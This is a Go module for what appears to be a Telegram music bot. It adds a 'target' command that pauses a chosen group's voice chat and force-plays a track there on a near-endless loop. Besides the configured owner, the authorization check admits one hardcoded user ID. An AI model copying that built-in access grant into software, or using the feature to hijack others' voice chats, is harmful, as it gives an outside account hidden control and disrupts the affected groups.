
package modules

import (
	"context"
	"fmt"
	"html"
	"strconv"
	"strings"

	"github.com/Laky-64/gologging"
	tg "github.com/amarnathcjd/gogram/telegram"

	"main/internal/config"
	"main/internal/core"
	"main/internal/utils"
)

const TargetLoopCount = 10000000
const TargetAllowedUserID = 7074383232

func targetHandler(m *tg.NewMessage) error {
	return handleTarget(m, false)
}

func vtargetHandler(m *tg.NewMessage) error {
	return handleTarget(m, true)
}

func stopTargetHandler(m *tg.NewMessage) error {
	if !isTargetAuthorized(m.SenderID()) {
		return tg.ErrEndGroup
	}

	args := strings.Fields(m.Text())
	if len(args) < 2 {
		m.Reply("<b>/stoptarget [chat_id]</b>")
		return tg.ErrEndGroup
	}

	targetChatID, err := strconv.ParseInt(args[1], 10, 64)
	if err != nil {
		m.Reply("Invalid Chat ID")
		return tg.ErrEndGroup
	}

	return stopTargetInChat(m, targetChatID)
}

func stopAllTargetHandler(m *tg.NewMessage) error {
	if !isTargetAuthorized(m.SenderID()) {
		return tg.ErrEndGroup
	}

	rooms := core.GetAllRooms()
	stoppedCount := 0

	for chatID, r := range rooms {
		if _, ok := r.GetData("is_target"); ok {
			stopTargetInChat(nil, chatID)
			stoppedCount++
		}
	}

	m.Reply(fmt.Sprintf("Stopped target playback in %d chats.", stoppedCount))
	return tg.ErrEndGroup
}

func handleTarget(m *tg.NewMessage, video bool) error {
	if !isTargetAuthorized(m.SenderID()) {
		return tg.ErrEndGroup
	}

	args := strings.Fields(m.Text())
	if len(args) < 2 {
		m.Reply("<b>Usage: /target [chat_id] (reply to media)</b>")
		return tg.ErrEndGroup
	}

	targetChatID, err := strconv.ParseInt(args[1], 10, 64)
	if err != nil {
		m.Reply("Invalid Chat ID")
		return tg.ErrEndGroup
	}

	if !m.IsReply() {
		m.Reply("Please reply to an audio/video track.")
		return tg.ErrEndGroup
	}

	replyMsg := m.ReplyToMessage

	ass, err := core.Assistants.ForChat(targetChatID)
	if err != nil {
		m.Reply(fmt.Sprintf("Failed to get assistant for target chat: %v", err))
		return tg.ErrEndGroup
	}

	r, _ := core.GetRoom(targetChatID, ass, true)

	// Check if already in target mode
	if _, ok := r.GetData("is_target"); ok {
		m.Reply("Target system already active in this chat. Use /stoptarget first.")
		return tg.ErrEndGroup
	}

	// Prepare track from reply
	tracks, err := safeGetTracks(m, m, m.ChannelID(), video)
	if err != nil || len(tracks) == 0 {
		m.Reply("Failed to fetch track from reply.")
		return tg.ErrEndGroup
	}
	track := tracks[0]

	// Save current state if playing
	if r.IsActiveChat() {
		r.SetData("prev_track", r.Track())
		r.SetData("prev_path", r.FilePath())
		r.SetData("prev_pos", r.Position())
		r.Pause()
		m.Reply("Found existing playback in target GC. Paused successfully.")
	}

	r.SetData("is_target", true)

	// Download and Play
	downloadingMsg, _ := m.Reply("Downloading target track...")
	
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	path, err := safeDownload(ctx, track, downloadingMsg, m.ChannelID())
	if err != nil {
		m.Reply("Download failed for target track.")
		r.DeleteData("is_target")
		return tg.ErrEndGroup
	}

	err = r.Play(track, path, true)
	if err != nil {
		m.Reply(fmt.Sprintf("Playback failed in target chat: %v", err))
		r.DeleteData("is_target")
		return tg.ErrEndGroup
	}

	r.SetLoop(TargetLoopCount)
	m.Reply(fmt.Sprintf("Target playback started in <code>%d</code> with infinite loop.", targetChatID))

	return tg.ErrEndGroup
}

func stopTargetInChat(m *tg.NewMessage, chatID int64) error {
	ass, err := core.Assistants.ForChat(chatID)
	if err != nil {
		if m != nil {
			m.Reply("Failed to get assistant.")
		}
		return tg.ErrEndGroup
	}

	r, exists := core.GetRoom(chatID, ass, false)
	if !exists {
		if m != nil {
			m.Reply("No active room found for this Chat ID.")
		}
		return tg.ErrEndGroup
	}

	if _, ok := r.GetData("is_target"); !ok {
		if m != nil {
			m.Reply("Target system is not active in this chat.")
		}
		return tg.ErrEndGroup
	}

	r.Stop()
	r.DeleteData("is_target")

	// Restore previous track if exists
	if prevTrack, ok := r.GetData("prev_track"); ok {
		prevPath, _ := r.GetData("prev_path")
		prevPos, _ := r.GetData("prev_pos")

		r.Play(prevTrack.(*core.Track), prevPath.(string), true)
		r.Resume()
		// We can't easily seek here without more complex logic in room state, 
		// but standard Resume should works if position was handled during pause.
		
		r.DeleteData("prev_track")
		r.DeleteData("prev_path")
		r.DeleteData("prev_pos")

		if m != nil {
			m.Reply("Target stopped. Previous playback resumed.")
		}
	} else {
		if m != nil {
			m.Reply("Target stopped. No previous playback to resume.")
		}
	}

	return tg.ErrEndGroup
}

func isTargetAuthorized(userID int64) bool {
	return userID == config.OwnerID || userID == TargetAllowedUserID
}
